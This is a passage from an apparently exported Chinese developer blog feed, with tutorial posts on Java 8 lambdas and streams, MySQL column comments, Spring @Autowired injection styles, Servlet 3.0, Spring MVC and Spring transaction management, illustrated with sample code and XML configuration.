    <content type="text"><![CDATA[前言在开发安卓的时候就通过RxJava进行过函数式编程。java源码中的建造者模式也是类似函数式编程的玩意。举个例子1234String url = builder.baseUrl(url) .param("username", "admin") .param("password", "admin") .build(); Lambda表达式-使代码更简洁通过匿名内部类，我们可以减少类的数量，并且逻辑更清晰。123456789@Testpublic void test() &#123; new Thread(new Runnable() &#123; @Override public void run() &#123; System.out.println("测试"); &#125; &#125;);&#125; 但是，这明显还不够简洁。Runable只有一个方法run()，每次都要重复相同的代码。java8提供了Lambda表达式。用于满足这种只有一个方法的接口的简洁写法。原本5行代码浓缩成了1行！1234@Testpublic void test() &#123; new Thread(() -&gt; System.out.println("测试"));&#125; 常见的表达式1234567891011121314Runable noArguments = () -&gt; System.out.println("无参Lambda");ActionListener oneArguments = event -&gt; System.out.println("含有一个参数的Lambda");Runable multiStatement = () -&gt; &#123; System.out.println("含有多行"); System.out.println("代码的Lambda");&#125;;BinaryOperator(Long) multiArgument = (x,y) -&gt; &#123; System.out.println("含有多个参数的Lambda"); return x+y;&#125;BinaryOperator(Long) multiArgument = (Long x, Long y) -&gt; &#123; System.out.println("含有多个指定类型的参数的Lambda"); return x+y;&#125; Stream流-新的迭代方式在java8以前，迭代一般都是通过for或者while实现。在java5，产生了foreach的迭代方式。现在，java8提供了新的Stream的迭代方式。 基本使用collect(toList())创建集合通过12345 @Testpublic void test() &#123; List&lt;Integer&gt; list = Stream.of(1, 2, 3, 4, 5, 6, 7, 8, 9).collect(Collectors.toList()); System.out.println(list);//[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125; filter()过滤有时候需要获取满足条件的集合元素。比如大于5的元素1234567@Testpublic void test() &#123; List&lt;String&gt; list = Stream.of(1, 2, 3, 4, 5, 6, 7, 8, 9) .filter(x -&gt; x&gt;5) .collect(Collectors.toList()); System.out.println(list);//[6, 7, 8, 9]&#125; max()最大值与min()最小值这里的最大值最小值不只是指长度或数值上的大小。可以进行自定义排序的指标。123456@Testpublic void test() &#123; String max = Stream.of(&quot;i&quot;,&quot;love&quot;,&quot;you&quot;).max(Comparator.comparing(String::length)).get(); String min = Stream.of(&quot;i&quot;,&quot;love&quot;,&quot;you&quot;).min(Comparator.comparing(String::length)).get(); System.out.println(max+&quot;,&quot;+min);// love, i&#125; Map转换map()转换类型将int转换为String类型12345678@Testpublic void test() &#123; List&lt;String&gt; list = Stream.of(1, 2, 3, 4, 5, 6, 7, 8, 9) .map(x -&gt; &quot;数字&quot;+x) .collect(Collectors.toList()); System.out.println(list); //[数字1, 数字2, 数字3, 数字4, 数字5, 数字6, 数字7, 数字8, 数字9]&#125; flatMap()转换类型将多个Stream压缩成一个Stream12345678910@Testpublic void test() &#123; List&lt;Integer&gt; list1 = Stream.of(1, 2, 3, 4, 5, 6, 7, 8, 9).collect(Collectors.toList()); List&lt;Character&gt; list2 = Stream.of('a','b','c').collect(Collectors.toList()); System.out.println(Stream.of(list1, list2) .flatMap(list -&gt; list.stream()) //.flatMap(Collection::stream) //方法引用 .collect(Collectors.toList()));&#125; reduce()一组数据生成一个数据上面的max()和min()都是reduce操作求和例子，12345678@Testpublic void test() &#123; int sum = Stream.of(1, 2, 3, 4, 5, 6, 7, 8, 9) .reduce(0, (acc, element) -&gt; acc+element);// long sum2 = Stream.of(1, 2, 3, 4, 5, 6, 7, 8, 9).mapToInt(x -&gt; x).summaryStatistics().getSum(); // 开发时应使用这种方式求和 System.out.println(sum);&#125; ::方法引用上面的flatMap方法中，使用了Collection::stream，类似C++的语法。等价于list -&gt; list.stream()。123456@Testpublic void test() &#123; List&lt;String&gt; list1 = Stream.of("i", "love","you").collect(Collectors.toList()); String max = list1.stream().max(Comparator.comparing(String::length)).get(); System.out.println(max);&#125; collect收集器的使用上面的例子中有一个collect方法，可以将Stream转化为List等集合对象。12345@Testpublic void test() &#123; List&lt;String&gt; list = Stream.of("i", "love","you").collect(Collectors.toList()); System.out.println(list);&#125; 转化为指定集合类型 有时候需要指定特定的集合比如TreeSet之类的。需要手动指定产生集合。123456@Testpublic void test() &#123; Set&lt;String&gt; set = Stream.of("i", "love","you") .collect(Collectors.toCollection(TreeSet::new)); System.out.println(set);&#125; 转化为值 有时候需要按照某种顺序找到一个值。比如找一个最长的单词。这个例子在实际开发中不使用。123456789@Testpublic void reduce() &#123; String max = Stream.of("i", "love","you") .collect(Collectors.maxBy( Comparator.comparing(String::length) )) .get(); System.out.println(max);&#125; 集合生成字符串 有时候需要将集合的所有字符提取出来，组合在一起12345@Testpublic void reduce() &#123; String str = Stream.of("i", "love","you").collect(Collectors.joining("*","(",")")); System.out.println(str);//(i*love*you)&#125; 数据分块分组 partitioningBy将Stream分成两个部分，存储在一个Map中，以true和false为键。12345678@Testpublic void test() &#123; Map&lt;Boolean, List&lt;String&gt;&gt; map = Stream.of(&quot;i&quot;, &quot;love&quot;,&quot;you&quot;) .collect(Collectors.partitioningBy(str-&gt;str.length()&gt;3)); for(Map.Entry entry : map.entrySet())&#123; System.out.println(entry.getKey()+&quot;,&quot;+entry.getValue()); &#125;&#125; 大部分情况需要分成不止两个部分，可能更多。groupingBy可以将Stream分成多个部分，下面的例子是将相同长度的字符串存储到一起。12345678@Testpublic void test() &#123; Map&lt;Integer, List&lt;String&gt;&gt; map = Stream.of(&quot;i&quot;, &quot;love&quot;,&quot;you&quot;, &quot;hhh&quot;) .collect(Collectors.groupingBy(String::length)); for(Map.Entry entry : map.entrySet())&#123; System.out.println(entry.getKey()+&quot;,&quot;+entry.getValue()); &#125;&#125; 下游收集器 使用groupingBy的时候发现有多个重载方法。groupingBy(Function classifier, Collector downstream)提供了一个下游收集器downstream。可以将classifier收集的流，通过downstream转化。如下面代码12345678910111213@Testpublic void test()&#123; List&lt;String&gt; list = Stream.of(&quot;i&quot;,&quot;love&quot;,&quot;you&quot;,&quot;too&quot;).collect(Collectors.toList()); Map&lt;Integer, Long&gt; map = list.stream().collect( Collectors.groupingBy(String::length, //根据字符串长度转化为map集合 Collectors.counting())); //处理上游的map集合，转化为集合的个数 for(Map.Entry entry : map.entrySet())&#123; System.out.println(entry.getKey()+&quot;,&quot;+entry.getValue()); &#125; // 1, 1 // 3, 2 // 4, 1&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>Java8</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL获取字段注释comment]]></title>
    <url>%2Fposts%2FMySQL_how_to_get_comment_of_table.html</url>
    <content type="text"><![CDATA[前言web开发经常需要用到&lt;table&gt;显示数据。而&lt;th&gt;经常使用的是硬编码方式写死在代码中。MySQL支持将添加字段注释，可获取注释信息，用来动态修改&lt;th&gt;的标题。 使用现在有一张学生表12345create table student( sid int comment 'student_id', name varchar(20) comment 'student_name' tid int comment 'teacher_id'); 需要获取字段注释12List&lt;String&gt; comments = studentDao.getComments();//[student_id, student_name, teacher_id] 通过以下sql语句即可完成1234select column_commentfrom information_schema.columnswhere table_schema = database()and table_name = 'student';]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring自动装配@Autowired的三种方式]]></title>
    <url>%2Fposts%2FSpring_uses_%40Autowired_in_three_ways.html</url>
    <content type="text"><![CDATA[前言在IDEA升级2017版后，发现以前使用的@Autowired出现了个警告Field injection is not recommended。虽然不是异常，但就是看着不舒服，所以google了一下，发现了stackoverflow 已经有人提了这个问题，并得到了解答。 @Autowired的不推荐用法在一个Bean内，可以使用@Autowired注入另一个Bean。123456789@Componentpublic class Dependency&#123;&#125;@Componentpublic class DI&#123; @Autowired private Dependency dependency;&#125; 事实上，这就是我平常使用的方式，直接在Field上添加注解，简洁又好看。但这是不推荐的使用方法。 @Autowired的三种使用方式 通过构造器注入 通过setter方法注入 通过field反射注入 12345678910111213141516171819public class DI&#123; //通过构造器注入 private DependencyA a; @Autowired public DI(DependencyA a)&#123; this.a = a; &#125; //通过setter方法注入 private DependencyB b; @Autowired public void setDependencyB(DependencyB b)&#123; this.b = b; &#125; //通过field反射注入 @Autowired private DependencyC c;&#125; 弊端如果你使用的是构造器注入恭喜你，当你有十几个甚至更多对象需要注入时，你的构造函数的参数个数可能会长到无法想像。 如果你使用的是field反射注入如果不使用Spring框架，这个属性只能通过反射注入，太麻烦了！这根本不符合JavaBean规范。还有，当你不是用过Spring创建的对象时，还可能引起NullPointerException。并且，你不能用final修饰这个属性。 如果你使用的是setter方法注入那么你将不能将属性设置为final。 两者取其轻Spring3.0官方文档建议使用setter注入覆盖构造器注入。Spring4.0官方文档建议使用构造器注入。 结论如果注入的属性是必选的属性，则通过构造器注入。如果注入的属性是可选的属性，则通过setter方法注入。至于field注入，不建议使用。 参考资料 Field Dependency Injection Considered Harmful What exactly is Field Injection and how to avoid it?]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Servlet3.0新特性]]></title>
    <url>%2Fposts%2FServlet3.0.html</url>
    <content type="text"><![CDATA[前言Servlet3.0使用了注解来配置web应用，极大缩减了web.xml的配置。 新增注解 注解 作用 @WebServlet 修饰一个Servlet类 @WebFilter 修饰一个Filter类 @WebListener 修饰一个Listener类 @WebInitParam 为Servlet、Filter类配置参数 @MultipartConfig 指定Servlet处理文件上传 对Web模块支持Servlet3.0不再要求所有Web组件全部写在web.xml中。 需要在META-INF中添加Web模块部署描述符web-fragment.xml。123456789101112131415161718192021&lt;?xml version="1.0" encoding="GBK" ?&gt;&lt;web-fragment xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-fragment_3_0.xsd version="3.0"&gt; &lt;name&gt;模块名&lt;/name&gt; &lt;ordering&gt; &lt;after&gt;&lt;!-- 在哪些模块后加载 --&gt; &lt;name&gt;模块1&lt;/name&gt; &lt;others/&gt; &lt;!-- others --&gt; &lt;/after&gt; &lt;before&gt;&lt;!-- 在哪些模块前加载 --&gt; &lt;name&gt;模块2&lt;/name&gt; &lt;others/&gt; &lt;!-- others --&gt; &lt;/before&gt; &lt;/ordering&gt; &lt;!-- 配置Servlet、Filter、Listener --&gt;&lt;/web-fragment&gt; 也可以在web.xml中指定加载顺序123456&lt;web-app&gt; &lt;absolute-ordering&gt; &lt;name&gt;模块名&lt;/name&gt; &lt;others/&gt; &lt;/absolute-ordering&gt;&lt;/web-app&gt; 注解配置Web组件 不能在web.xml的&lt;web-app/&gt;指定metadata-complete=&quot;true&quot; 如果metadata-complete设置为true，部署工具必须必须忽略存在于应用的类文件中的所有servlet注解和web fragments。如果metadata-complete属性没有指定或设置为false，部署工具必须检查应用的类文件的注解，并扫描web fragments。 123456789@Servletpublic class MyServlet extends HttpServlet&#123;&#125;@WebFilterpublic class MyFilter implements Filter&#123;&#125;@WebListenerpublic class MyListener implements ServletContextAttributeListener&#123;&#125; 动态注册Web组件Servlet3.0提供了ServletContext添加组件的方式12345678910111213141516171819/** 添加Servlet */ public ServletRegistration.Dynamic addServlet(String servletName, String className); public ServletRegistration.Dynamic addServlet(String servletName, Servlet servlet); public ServletRegistration.Dynamic addServlet(String servletName, Class&lt;? extends Servlet&gt; servletClass); /** 添加Filter */ public FilterRegistration.Dynamic addFilter(String filterName, String className); public FilterRegistration.Dynamic addFilter(String filterName, Filter filter); public FilterRegistration.Dynamic addFilter(String filterName, Class&lt;? extends Filter&gt; filterClass); /** 添加Listener */ public void addListener(String className); public &lt;T extends EventListener&gt; void addListener(T t); public void addListener(Class&lt;? extends EventListener&gt; listenerClass); 通过ServletContextListener注册1234567891011121314151617181920212223242526//这里不用@Servlet注解配置public class MyServlet extends HttpServlet&#123;&#125;public class InitListener implements ServletContextListener&#123; public void contextDestroyed(ServletContextEvent event) &#123; System.out.println("服务器关闭时会调用该方法"); &#125; @Override public void contextInitialized(ServletContextEvent event) &#123; System.out.println("服务器启动时会调用该方法"); ServletContext context = contextEvent.getServletContext(); //注册一个没有使用@WebServlet注解的类为Servlet ServletRegistration register = context.addServlet("helloServlet", HelloServlet.class); //为动态注册的Servlet设定访问URL(可设定多个) register.addMapping("/hello", "/servlet/hello"); //为动态注册的Servlet设定初始参数 //相当于以前的&lt;init-param&gt; register.setInitParameter("logPath", "/app/log"); register.setInitParameter("savePath", "/app/upload"); &#125; &#125; 通过ServletContainerInitializer注册添加META-INF/services/javax.servlet.ServletContainerInitializer文件。文件内容为1com.ahao.demo.MyServletContainerInitializer 指定自定义的ServletContainerInitializer。1234567891011121314151617181920@HandlesTypes(&#123; WebApplicationInitializer.class &#125;) //@HandlesTypes(&#123; HttpServlet.class &#125;)//实现或者继承HandlesTypes注解中的类的都会被加载public class MyServletContainerInitializer implements ServletContainerInitializer &#123; //以Set集合的方式传递注解中指定的类型的所有子类(包括子接口、实现类等)的class对象 public void onStartup(Set&lt;Class&lt;?&gt;&gt; c, ServletContext servletContext) throws ServletException &#123; // 动态注册Servlet ServletContext context = sce.getServletContext(); ServletRegistration.Dynamic servlet = context.addServlet("myServlet", MyServlet.class); dynamicServlet.addMapping("/myServlet"); dynamicServlet.setAsyncSupported(true); dynamicServlet.setLoadOnStartup(1); // 动态注册Filter FilterRegistration.Dynamic filter = context.addFilter("MyFilter", MyFilter.class); // 动态注册Listener context.addListener("com.ahao.demo.MyListener"); &#125; &#125; 文件上传HttpServletRequest提供处理文件上传的支持。 Part getPart(String name) Collection&lt;Part&gt; getParts() Part对应一个文件上传域，支持访问文件类型、大小、输入流等。文件上传需要给form表单添加enctype属性，该属性有三个值： 属性值 说明 application/x-www-form-urlencoded 默认编码方式，对form的value属性进行URL编码 multipart/form-data 二进制方式处理表单数据，上传文件用 text/plain 适用于直接通过表单发送邮件 1234&lt;form action="upload" method="post" enctype="multipart/form-data"&gt; &lt;input type="file" name="myfile" /&gt; &lt;input type="submit"/&gt;&lt;/form&gt; 在Servlet中处理上传数据，使用@MultipartConfig修饰，或者在web.xml中&lt;servlet&gt;标签中添加&lt;multipart-config/&gt;子标签12345678910@WebServlet(name="upload",urlPatterns=&#123;"/upload"&#125;)@MultipartConfigpublic class UploadServlet extends HttpServlet&#123; public void doPost(HttpServletRequest request,HttpServletResponse response)&#123; Part part = request.getPart("myfile"); out.println("文件类型:"+part.getContentType()+"&lt;br/&gt;"); out.println("文件大小:"+part.getSize()+"&lt;br/&gt;"); part.write(getServletContext().getRealPath("/uploadFiles")+"/"+"myfile"); &#125;&#125; 异步处理 支持Servlet、Filter。 当Servlet执行耗时操作时，必须等完成操作才能生成响应。Servlet3.0允许Servlet创建一个线程去执行耗时操作。 先要给Servlet配置允许异步操作 在xml中配置： 1234&lt;servlet&gt; &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt; &lt;async-supported&gt;true&lt;/async-supported&gt;&lt;/servlet&gt; 在注解中配置： 123@WebServlet(urlPattern="/async",asyncSupported=true)public class AsyncServlet extends HttpServlet&#123;&#125; 通过ServletRequest创建AsyncContext对象通过AsyncContext类实现，重复调用创建方法得到同一个AsyncContext对象。123456789@WebServlet(urlPattern="/async",asyncSupported=true)public class AsyncServlet extends HttpServlet&#123; public void doGet(HttpServletRequest request,HttpServletResponse response)&#123; AsyncContext actx = request.startAsync(); //AsyncContext actx = reuqets.startAsync(request,response); actx.setTimeout(3000);//设置超时时间 actx.start(new Executor(actx));//启用线程 &#125;&#125; 异步监听当需要了解异步操作执行细节时，可以使用AsyncListener监听器。123456789101112131415//actx.addListener(new MyAsyncListener());public class MyAsyncListener implements AsyncListener&#123; public void onStartAsync(AsyncContext event)&#123; System.out.println("异步调用开始"); &#125; public void onComplete(AsyncContext event)&#123; System.out.println("异步调用完成"); &#125; public void onError(AsyncContext event)&#123; System.out.println("异步调用异常"); &#125; public void onTimeout(AsyncContext event)&#123; System.out.println("异步调用超时"); &#125;&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC简单使用]]></title>
    <url>%2Fposts%2FSpring_MVC_simple_use.html</url>
    <content type="text"><![CDATA[构建环境导入maven spring-webmvc jstl slf4j-log4j12 servlet-api 配置web.xml1234567891011121314151617181920212223242526272829&lt;web-app&gt; &lt;display-name&gt;JavaeeDemo&lt;/display-name&gt; &lt;!--spring--&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;/WEB-INF/configs/spring/spring-bean.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.request.RequestContextListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!--spring webmvc--&gt; &lt;servlet&gt; &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;/WEB-INF/configs/spring/mvc-dispatcher-servlet.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; 配置spring的xml/WEB-INF/configs/spring/mvc-dispatcher-servlet.xml的配置123456789101112131415&lt;beans&gt; &lt;context:annotation-config/&gt;&lt;!--开启注解--&gt; &lt;context:component-scan base-package="com.ahao.javaeeDemo"&gt;&lt;!--扫描包下的Controller注解--&gt; &lt;context:include-filter type="annotation" expression="org.springframework.stereotype.Controller"/&gt; &lt;/context:component-scan&gt; &lt;mvc:annotation-driven/&gt;&lt;!--开启注解驱动--&gt; &lt;!--&lt;mvc:resources mapping="/resources/**" location="/resources"/&gt;--&gt;&lt;!--导入静态资源css等--&gt; &lt;!--配置ViewResolver--&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="viewClass" value="org.springframework.web.servlet.view.JstlView"/&gt; &lt;property name="prefix" value="/WEB-INF/jsps/"/&gt; &lt;property name="suffix" value=".jsp"/&gt; &lt;property name="order" value="1000"/&gt;&lt;!--配置多个Resolver，InternalResourceViewResolver要排在最后--&gt; &lt;/bean&gt;&lt;/beans&gt; /WEB-INF/configs/spring/spring-bean.xml的配置123456&lt;beans&gt; &lt;context:annotation-config/&gt;&lt;!--开启注解--&gt; &lt;context:component-scan base-package="com.ahao.javaeeDemo"&gt;&lt;!--扫描包下的注解，排除Controller注解--&gt; &lt;context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/&gt; &lt;/context:component-scan&gt;&lt;/beans&gt; url映射get、post方式匹配使用@RequestParam注入参数，封装成对象再传入model，在jsp页面中用EL表达式获取即可。1234567891011@Controller@RequestMapping("/hello") // 匹配http://localhost:8080/hello路径public class MyController &#123; @RequestMapping(value = "/mvc", method = RequestMethod.GET) // 匹配http://localhost:8080/hello/mvc，只接收get请求 public String hello(@RequestParam("name") String name, // 匹配http://localhost:8080/hello/mvc?name=? Model model)&#123; User user = new User(name); model.addAttribute(user); return "home"; &#125;&#125; 使用ServletAPI直接注入HttpServletRequest或者HttpSession1234567891011@Controller@RequestMapping("/hello")public class MyController&#123; @RequestMapping(value="/mvc", method=RequestMathod.GET) // 匹配http://localhost:8080/hello/mvc? public String hello(HttpServletRequest request)&#123; String name = request.getParameter("name"); // 从request中获得请求参数 User user = new User(name); request.setAttribute("user",user); return "home"; &#125;&#125; restful方式匹配使用@PathVariable注入参数12345678910@Controller@RequestMapping("/hello")public class MyController&#123; @RequestMapping(value="/mvc/&#123;name&#125;", method=RequestMethod.GET) // 匹配http://localhost:8080/hello/mvc/hhh public String hello(@PathVariable("name") String name, Map&lt;String,Object&gt; model)&#123; User user = new User(name); model.put("user", user); return home; &#125;&#125; 文件上传jsp提交页面1234&lt;form method="post" action="&lt;%=request.getContextPath()%&gt;/hello/doUpload" enctype="multipart/form-data"&gt; &lt;input type="file" name="file"/&gt; &lt;input type="submit" /&gt;&lt;/form&gt; 配置spring1234567&lt;beans&gt; &lt;bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver"&gt; &lt;property name="maxUploadSize" value="209715200"/&gt; &lt;property name="defaultEncoding" value="UTF-8"/&gt; &lt;property name="resolveLazily" value="true"/&gt;&lt;!--推迟文件解析，用以捕获文件大小异常--&gt; &lt;/bean&gt;&lt;/beans&gt; 配置Controller1234567891011121314151617@Controller@RequestMapping("/hello")public class MyController&#123; @RequestMapping(value="/&#123;name&#125;", method=RequestMethod.GET) public String hello(@PathVariable("name") String name, Model model)&#123; User user = new User(name); return "home"; &#125; @RequestMapping(value="/doUpload",method=RequestMethod.POST) public String doUpload(@RequestParam("file") MultipartFile file) throws IOException&#123; if(!file.isEmpty())&#123; System.out.println("文件名:"+file.getOriginalFilename()); FileUtils.copyInputStreamToFile(file.getInputStream(), new File("D:\\", file.getOriginalFilename+".bak")); &#125; return "redirect:"+file.getOriginalFilename(); &#125;&#125; 返回json格式数据配置spring123456789101112131415161718192021&lt;beans&gt; &lt;bean id="contentNegotiationManager" class="org.springframework.web.accept.ContentNegotiationManagerFactoryBean"&gt; &lt;property name="ignoreAcceptHeader" value="true"/&gt; &lt;property name="mediaTypes"&gt; &lt;map&gt; &lt;entry key="json" value="application/json"/&gt; &lt;entry key="xml" value="application/xml"/&gt; &lt;entry key="htm" value="text/html"/&gt; &lt;/map&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean class="org.springframework.web.servlet.view.ContentNegotiationViewResolver"&gt; &lt;property name="order" value="1"/&gt; &lt;property name="contentNegotiationManager" ref="contentNegotiationManager"/&gt; &lt;property name="defaultViews"&gt; &lt;list&gt; &lt;bean class="org.springframework.web.servlet.view.json.MappingJackson2JsonView"/&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 配置Controller123456789101112@Controller@RequestMapping("/hello")public class MyController&#123; @RequestMapping(value="/json1/&#123;name&#125;", method=RequestMethod.GET) public @ResponseBody User getUserJson1(@PathVariable("name") String name)&#123; return new User(name); &#125; @RequestMapping("value"/json2/&#123;name&#125;", method=ReuqestMethod.GET) public ResponseEntity&lt;User&gt; getUserJson2(@PathVariable String name)&#123; return new ResponseEntity&lt;User&gt;(new User(name), HttpStatus.OK) &#125;&#125; 拦截器 实现HandlerInterceptor接口 实现WebRequestInterceptor接口 : 不能拦截请求]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring事务管理]]></title>
    <url>%2Fposts%2FSpring_Transaction_Management.html</url>
    <content type="text"><![CDATA[接口介绍 PlatformTransactionManager事务管理器 TransactionDefinition事务定义信息 ISOLATION隔离级别 PROPAGATION传播行为 TIMEOUT超时信息 TransactionStatus事务具体运行状态 编程式事务管理（很少应用）通过TransactionTemplate手动管理事务，在service使用TransactonTemplate，依赖DataSourceTransactionManager，依赖DataSource构造spring配置1234567891011121314151617181920212223&lt;beans&gt; &lt;!--配置数据库连接池DataSource--&gt; &lt;bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource"&gt; &lt;property name="driverClass" value="com.mysql.cj.jdbc.Driver"/&gt; &lt;property name="jdbcUrl" value="jdbc:mysql://localhost:3306/test?serverTimeZone=GMT&amp;useUnicode=true&amp;characterEncoding=utf8"/&gt; &lt;property name="user" value="root"/&gt; &lt;property name="password"value="root"/&gt; &lt;/bean&gt; &lt;!--在service层注入事务管理模板--&gt; &lt;bean id="accountService" class="com.ahao.javaeeDemo.service"&gt; &lt;property id="dao" ref="accountDao"/&gt; &lt;property id="transactionTemplate" ref="transactionTemplate" /&gt; &lt;/bean&gt; &lt;!--配置事务管理模板--&gt; &lt;bean id="transactionTemplate" class="org.springframework.transaction.support.TransactionTemplate"&gt; &lt;property name="transactionManager" ref="transactionManager"/&gt;&lt;!--注入事务管理器--&gt; &lt;/bean&gt; &lt;!--配置事务管理器--&gt; &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource"/&gt;&lt;!--注入数据库连接池--&gt; &lt;/bean&gt;&lt;/beans&gt; 在service层编写java代码1234567891011121314public class AccountServiceImpl implements AccountService&#123; private AccountDao dao; private TransactionTemplate transactionTemplate; // getter And Setter public void transfer(String out, String in, Double money)&#123; transactionTemplate.execute(new TransactionCallbackWithoutResult()&#123; protected void doInTransactionWithoutResult(TransactionStatus status)&#123; dao.outMoney(out, money); int i = 1/0;//引发异常，事务回滚 dao.inMoney (in, money); &#125; &#125;); &#125;&#125; 声明式事务管理通过XML配置，代码侵入性小，通过AOP实现需要导入 http://mvnrepository.com/artifact/aopalliance/aopalliance http://mvnrepository.com/artifact/org.springframework/spring-aop 基于TransactionProxyFactoryBean的方式（很少应用）缺点是要为每个增强类添加一个TransactionProxyFactoryBean配置。spring配置12345678910111213141516171819202122&lt;beans&gt; &lt;!--配置数据库连接池DataSource--&gt; &lt;!--service层--&gt; &lt;bean id="accountService" class="com.ahao.javaeeDemo.service"&gt; &lt;property id="dao" ref="accountDao"/&gt; &lt;/bean&gt; &lt;!--创建代理对象--&gt; &lt;bean id="accountServiceProxy" class="org.springframework.transaction.interceptor.TransactionProxyFactoryBean"&gt; &lt;property name="target" ref="accountService"/&gt;&lt;!--注入被增强的对象--&gt; &lt;property name="transactionManager" ref="transactionManager"/&gt;&lt;!--注入事务管理器--&gt; &lt;property name="transactionAttributes"&gt; &lt;props&gt; &lt;!--&lt;prop key"save*表示以save开头的方法"&gt;PROPAGATION(事务传播行为),ISOLATION(事务隔离级别),readOnly(只读),-Exception(发生某些异常回滚),+Exception(发生某些异常不回滚)&lt;/prop&gt;--&gt; &lt;prop key="transfer"&gt;PROPAGATION_REQUIRED&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!--配置事务管理器--&gt; &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource"/&gt;&lt;!--注入数据库连接池--&gt; &lt;/bean&gt;&lt;/beans&gt; 基于AspectJ的XML方式（推荐）需要导入 http://mvnrepository.com/artifact/org.aspectj/aspectjweaver http://mvnrepository.com/artifact/org.springframework/spring-aop spring配置12345678910111213141516171819202122232425&lt;beans&gt; &lt;!--配置数据库连接池DataSource--&gt; &lt;!--service层--&gt; &lt;bean id="accountService" class="com.ahao.javaeeDemo.service"&gt; &lt;property id="dao" ref="accountDao"/&gt; &lt;/bean&gt; &lt;!--配置事务的通知--&gt; &lt;tx:advice id="txAdvice" transaction-manager="transactionManager"&gt; &lt;tx:attributes&gt; &lt;tx:method name="transfer" propagation="REQUIRED" isolation="DEFAULT" read-only="false" no-rollback-for="MyException1" rollback-for="MyException2" timeout="-1"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!--配置切面--&gt; &lt;aop:config&gt; &lt;!--配置切入点--&gt; &lt;aop:pointcut id="pointcut" expression="execution(* com.ahao.javaeeDemo.service.AccountService+.*(..))"/&gt; &lt;!--配置切面--&gt; &lt;aop:advisor advice-ref="txAdvice" pointcut-ref="pointcut" /&gt; &lt;/aop:config&gt; &lt;!--配置事务管理器--&gt; &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource"/&gt;&lt;!--注入数据库连接池--&gt; &lt;/bean&gt;&lt;/beans&gt; 基于注解的方式（代码侵入性强，配置简单）spring配置12345678910111213&lt;beans&gt; &lt;!--配置数据库连接池DataSource--&gt; &lt;!--service层--&gt; &lt;bean id="accountService" class="com.ahao.javaeeDemo.service"&gt; &lt;property id="dao" ref="accountDao"/&gt; &lt;/bean&gt; &lt;!--配置注解驱动--&gt; &lt;tx:annotation-driven transaction-manager="transactionManager"/&gt; &lt;!--配置事务管理器--&gt; &lt;bean id="transactionManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource"/&gt;&lt;!--注入数据库连接池--&gt; &lt;/bean&gt;&lt;/beans&gt; 在类上添加注解12345678910111213@Transactional(propagation = Propagation.REQUIRED, isolation = Isolation.DEFAULT,readOnly = false)public class AccountServiceImpl implements AccountService &#123; private AccountDaoImpl dao; public void setDao(AccountDaoImpl dao) &#123; this.dao = dao; &#125; @Override public void transfer(String out, String in, Double money) &#123; dao.outMoney(out, money); int i = 1/0; dao.inMoney(in, money); &#125;&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ajax详解]]></title>
    <url>%2Fposts%2FAjax_simple_use.html</url>
